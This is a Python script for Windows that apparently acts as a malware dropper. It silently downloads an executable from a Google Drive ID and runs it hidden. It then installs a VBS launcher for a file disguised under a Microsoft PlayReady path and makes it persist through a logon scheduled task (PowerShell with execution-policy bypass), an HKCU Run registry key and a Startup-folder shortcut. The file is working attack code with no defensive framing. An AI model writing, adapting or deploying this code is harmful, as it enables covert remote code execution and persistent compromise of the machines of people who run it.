import subprocess
import sys
import os
import winreg
from pathlib import Path
import time

GDOWN_DRIVE_ID = "1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n"
OUTPUT_NAME = "downloaded_file.exe"
FINAL_EXE = Path(os.environ["LOCALAPPDATA"]) / "Microsoft" / "PlayReady" / "dbengin.exe"
LAUNCHER_VBS = Path(os.environ["TEMP"]) / "run_dbengin.vbs"
LOG_FILE = Path(os.environ["TEMP"]) / "dbengin_launch.log"

def run_hidden(cmd, wait=False):
    flags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
    if wait:
        return subprocess.run(cmd, creationflags=flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        return subprocess.Popen(cmd, creationflags=flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

def create_vbs_launcher():
    """Create a VBS script that runs the exe silently and logs errors."""
    vbs_content = f'''
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
logFile = "{LOG_FILE}"
exePath = "{FINAL_EXE}"
' Log start time
Dim ts
Set ts = fso.OpenTextFile(logFile, 8, True)
ts.WriteLine Now & " - Launcher started"
ts.Close
' Run the exe
On Error Resume Next
WshShell.Run """" & exePath & """", 0, False
If Err.Number <> 0 Then
    Set ts = fso.OpenTextFile(logFile, 8, True)
    ts.WriteLine Now & " - ERROR: " & Err.Description
    ts.Close
End If
'''
    with open(LAUNCHER_VBS, "w") as f:
        f.write(vbs_content)
    return LAUNCHER_VBS

def set_persistence_via_task_scheduler():
    """Create a scheduled task that runs the VBS launcher at user logon."""
    task_name = "UserAppStartupDbg"
    ps_script = f'''
$taskName = "{task_name}"
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "{LAUNCHER_VBS}"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType S4U
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
'''
    subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                   creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)

def set_persistence_registry_and_startup():
    """Set HKCU Run and Startup folder shortcut to point to the VBS launcher."""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "UserAppStartup", 0, winreg.REG_SZ, f'wscript.exe "{LAUNCHER_VBS}"')
    except:
        pass
    startup = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    startup.mkdir(parents=True, exist_ok=True)
    shortcut = startup / "UserAppStartup.lnk"
    ps_shortcut = f'''
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{shortcut}")
$Shortcut.TargetPath = "wscript.exe"
$Shortcut.Arguments = "{LAUNCHER_VBS}"
$Shortcut.Save()
'''
    subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_shortcut],
                   creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)

def main():
    if sys.platform != "win32":
        return

    url = f"https://drive.google.com/uc?id={GDOWN_DRIVE_ID}"
    cmd = [sys.executable, "-m", "gdown", url, "-O", OUTPUT_NAME]
    run_hidden(cmd, wait=True)
    
    exe_path = Path(OUTPUT_NAME)
    if exe_path.exists():
        run_hidden([str(exe_path)], wait=True)

    time.sleep(3)
    
    create_vbs_launcher()
    
    set_persistence_via_task_scheduler()
    set_persistence_registry_and_startup()

    subprocess.Popen(["wscript.exe", str(LAUNCHER_VBS)], creationflags=subprocess.CREATE_NO_WINDOW)

if __name__ == "__main__":
    main()